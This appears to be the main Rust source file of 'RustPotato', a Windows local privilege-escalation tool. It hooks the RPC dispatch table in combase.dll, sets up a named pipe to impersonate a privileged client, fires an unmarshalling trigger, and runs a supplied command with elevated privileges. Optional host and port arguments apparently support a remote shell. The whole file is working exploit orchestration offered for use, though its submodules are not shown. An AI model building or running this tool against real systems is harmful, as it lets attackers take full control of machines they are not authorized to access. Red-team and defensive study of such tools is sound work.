extern crate alloc;

#[cfg(feature = "verbose")]
use libc_print::libc_println;

mod context;
mod def;
mod objref;
mod orcb;
mod parse_args;
mod rev;
mod token;
mod trigger;
mod utils;
mod win32;

use context::RustPotatoContext;
use parse_args::parse_args;

pub fn run(c: &str, h: Option<&str>, p: Option<u16>) -> Option<()> {
    // Initialize the main context for RustPotato operations
    let mut rust_potato = RustPotatoContext::new();

    // Step 1: Initialize the context
    // This involves locating the combase.dll module in memory and identifying the RPC_SERVER_INTERFACE structure.
    rust_potato.init_context()?;

    // Step 2: Set up the RPC context
    // Prepares the dispatch table and sets up function pointers for hooking.
    rust_potato.setup_rpc_context()?;

    // Step 3: Hook the RPC dispatch table
    // Installs a hook on the dispatch table to redirect specific RPC calls.
    rust_potato.hook_rpc()?;

    // Step 4: Start the named pipe server
    // Creates a named pipe to wait for a client connection for impersonation.
    rust_potato.start_pipe_server()?;

    // Step 5: Start the unmarshalling trigger
    // Executes the unmarshalling process to trigger interaction with the RPC server.
    rust_potato.start_trigger()?;

    // Step 6: Execute a command
    // Runs the specified command (`cmdline`) with elevated privileges.
    rust_potato.ex(&c, h, p);

    // Step 7: Restore the original RPC dispatch table
    // Removes the hook and restores the original state of the dispatch table.
    rust_potato.restore_hook_rpc();

    // Step 8: Stop the named pipe server
    // Cleans up and terminates the pipe server thread.
    rust_potato.stop_pipe_server();

    Some(())
}

fn main() {
    parse_args();
}
